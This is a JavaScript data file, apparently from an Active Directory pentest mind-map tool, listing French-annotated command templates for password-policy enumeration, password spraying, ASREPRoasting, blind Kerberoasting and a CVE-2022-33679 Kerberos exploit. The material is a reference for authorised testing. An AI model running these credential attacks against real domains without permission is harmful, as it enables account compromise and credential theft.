export const VALID_USER_DATA = [
  {
    name: 'Get Password Policy',
    nodes: [
      { 
        label: 'nxc smb --pass-pol', 
        cmd: 'nxc smb <dc_ip> -u <user> -p <password> --pass-pol', 
        leadsTo: 'Policy Info',
        description: 'Récupère la politique de mot de passe (longueur, complexité, verrouillage) via SMB pour calibrer le spraying.'
      },
      { 
        label: 'Get-ADDefaultDomainPasswordPolicy', 
        cmd: 'Get-ADDefaultDomainPasswordPolicy', 
        leadsTo: 'Policy Info',
        description: 'Commande PowerShell native pour obtenir la politique de mot de passe du domaine courant.'
      },
      { 
        label: 'ldeep domain_policy', 
        cmd: 'ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy', 
        leadsTo: 'Policy Info',
        description: 'Utilise ldeep pour dumper la politique de mot de passe via LDAP.'
      },
      { 
        label: 'Get-ADFineGrainedPasswordPolicy', 
        cmd: 'Get-ADFineGrainedPasswordPolicy -filter *', 
        leadsTo: 'Fined Policy',
        description: 'Récupère les politiques de mot de passe affinées (PSO) qui s\'appliquent à des groupes spécifiques (ex: Admins).'
      }
    ]
  },
  {
    name: 'Password Spray (User=Pass)',
    nodes: [
      { 
        label: 'nxc smb (User=Pass)', 
        cmd: 'nxc smb <dc_ip> -u <users.txt> -p <users.txt> --no-bruteforce --continue-on-success', 
        leadsTo: 'Clear text Credentials',
        description: 'Teste si le mot de passe est identique au nom d\'utilisateur pour chaque compte de la liste.'
      },
      { 
        label: 'Sprayhound (User=Pass)', 
        cmd: 'sprayhound -U <users.txt> -d <domain> -dc <dc_ip> --lower --upper', 
        leadsTo: 'Clear text Credentials',
        description: 'Sprayhound teste automatiquement user=user, user=user123, etc., en gérant intelligemment le verrouillage.'
      }
    ]
  },
  {
    name: 'Password Spray (Common)',
    nodes: [
      { 
        label: 'nxc smb (SeasonYear)', 
        cmd: 'nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --continue-on-success', 
        leadsTo: 'Clear text Credentials',
        description: 'Tente une liste courte de mots de passe courants (ex: Hiver2024!, Entreprise123) sur tous les utilisateurs.'
      },
      { 
        label: 'Kerbrute Password Spray', 
        cmd: 'kerbrute passwordspray -d <domain> <users.txt> <password>', 
        leadsTo: 'Clear text Credentials',
        description: 'Effectue le spraying via Kerberos (Pre-Auth), souvent plus rapide et générant moins de logs de connexion échouée que SMB.'
      }
    ]
  },
  {
    name: 'ASREPRoasting',
    nodes: [
      { 
        label: 'BloodHound Cypher Query', 
        cmd: 'MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u', 
        leadsTo: 'List Users',
        description: 'Requête Cypher pour identifier les utilisateurs vulnérables à ASREPRoast dans la base BloodHound.'
      },
      { 
        label: 'GetNPUsers.py (Impacket)', 
        cmd: 'GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>', 
        leadsTo: 'Hash found ASREP',
        description: 'Récupère le TGT chiffré des utilisateurs sans pré-authentification Kerberos pour le cracker offline.'
      },
      { 
        label: 'nxc ldap --asreproast', 
        cmd: 'nxc ldap <dc_ip> -u <users.txt> -p \'\' --asreproast <output.txt>', 
        leadsTo: 'Hash found ASREP',
        description: 'Module NetExec pour effectuer l\'attaque ASREPRoast en masse via LDAP.'
      },
      { 
        label: 'Rubeus asreproast', 
        cmd: 'Rubeus.exe asreproast /format:hashcat', 
        leadsTo: 'Hash found ASREP',
        description: 'Outil C# natif pour effectuer l\'attaque ASREPRoast depuis une machine Windows compromise.'
      }
    ]
  },
  {
    name: 'Blind Kerberoasting',
    nodes: [
      { 
        label: 'Rubeus Blind Kerberoast', 
        cmd: 'Rubeus.exe kerberoast /domain:<domain> /dc:<dcip> /nopreauth:<asrep_user> /spns:<users.txt>', 
        leadsTo: 'Hash found TGS',
        description: 'Kerberoasting sans compte valide, en utilisant un utilisateur ASREPRoastable pour demander les tickets de service.'
      },
      { 
        label: 'GetUserSPNs.py (Blind)', 
        cmd: 'GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>/"', 
        leadsTo: 'Hash found TGS',
        description: 'Version Impacket du Blind Kerberoasting utilisant un compte sans pré-auth pour demander des TGS.'
      }
    ]
  },
  {
    name: 'CVE-2022-33679',
    nodes: [
      { 
        label: 'CVE-2022-33679 Exploit', 
        cmd: 'python3 CVE-2022-33679.py <domain>/<user> <target>', 
        leadsTo: 'TGT / PTT',
        description: 'Exploite une vulnérabilité de downgrade Kerberos pour obtenir un TGT valide sans mot de passe.'
      }
    ]
  }
];